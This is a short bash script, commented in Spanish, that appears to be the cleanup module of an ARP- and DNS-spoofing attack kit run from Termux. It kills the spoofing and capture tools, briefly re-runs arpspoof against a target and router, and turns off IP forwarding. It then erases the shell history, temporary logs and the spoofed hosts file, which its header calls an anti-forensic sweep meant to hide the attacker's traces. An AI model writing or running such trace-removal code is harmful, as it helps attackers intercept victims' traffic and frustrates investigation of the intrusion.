#!/bin/bash
# NEXUS ANTI-FORENSIC SWEEP v1.0

echo "[*] INICIANDO LIMPIEZA DE HUELLAS (TRACE-REMOVER)..."

# 1. Detener Ataques Activos
killall arpspoof dnsspoof tcpdump 2>/dev/null

# 2. Restaurar el Router (Re-Arp)
# Enviamos paquetes ARP correctos para que la víctima recupere su internet real
su -c "arpspoof -i wlan0 -t $TARGET_IP $ROUTER_IP" & sleep 2 && killall arpspoof

# 3. Deshabilitar IP Forwarding
su -c "echo 0 > /proc/sys/net/ipv4/ip_forward"

# 4. Limpieza de Logs del Nexo
# Borramos el historial de comandos de Termux y archivos temporales
history -c
rm -rf ~/nexus/logs/*.tmp
rm -rf ~/nexus/conf/dns_spoof.hosts

echo "[✓] LIMPIEZA COMPLETADA: El Nexo vuelve a modo pasivo."
